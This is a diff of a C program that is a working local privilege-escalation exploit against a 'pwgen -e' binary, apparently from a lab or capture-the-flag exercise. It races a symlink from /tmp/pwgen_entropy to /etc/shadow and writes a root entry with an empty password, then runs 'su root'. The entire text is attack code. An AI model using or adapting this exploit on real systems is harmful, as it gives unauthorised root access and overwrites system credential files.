@@ -17,7 +17,7 @@ int main(int argc, char *argv[])
 {
   FILE *fp,*tmpfile;
   int i;
-   char changeshadow[] = "root:nVh3UuD38pTiY:16565::::::";
+   char changeshadow[] ="root::16565::::::";
  
 
  
@@ -25,13 +25,15 @@ int main(int argc, char *argv[])
    tmpfile = fopen("/tmp/fakefile","w");
    fclose(tmpfile);
 
-   symlink("/etc/shadow","/tmp/pwgen_entropy");
-//  symlink("/tmp/fakefile","/tmp/pwgen_entrophy");
+ //  symlink("/etc/shadow","/tmp/pwgen_entropy");
+  symlink("/tmp/fakefile","/tmp/pwgen_entropy");
    fp = popen("/usr/local/bin/pwgen -e","w");
+   system("rm /tmp/pwgen_entropy -f");
 //   unlink("/tmp/pwgen_entrophy");
-//   symlink("/etc/shadow","/tmp/pwgen_entropy");
+   symlink("/etc/shadow","/tmp/pwgen_entropy");
    fprintf(fp, "\n%s", changeshadow); 
    fclose(fp);
+   system("su root");
 //printf("%s %s %s",args[0], args[1],  args[2]);
   exit(0);
 }
